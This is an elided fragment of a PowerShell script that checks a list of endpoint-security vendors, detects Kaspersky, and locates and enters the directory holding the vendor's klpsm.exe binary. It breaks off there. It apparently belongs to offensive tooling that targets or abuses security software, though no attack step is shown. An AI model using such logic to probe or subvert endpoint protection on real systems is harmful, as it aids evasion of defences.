   ...
   ForEach($Item in $EDRvendors)
   {
      ...
      If($Testme -iMatch "$Item")
      {
         ...
         If($Testme -Match 'kaspersky')
         {
            ...
            {
               $KESPath = $null
               $KESList = @("$Env:PROGRAMFILES (x86)","$Env:PROGRAMFILES")
               :KSearch ForEach($KSDirectory in $KESList)
               {
                  ## Get kaspersky klpsm.exe directory name
                  $KESPath = (gci -Path "$KSDirectory\Kaspersky Lab" -Recurse -Force|Select *|?{$_.Name -Match 'klpsm.exe'}).DirectoryName
                  If(-not([string]::IsNullOrEmpty($KESPath))){break :KSearch}
               }

               If(Test-Path -Path "$KESPath")
               {
                  cd "$KESPath"
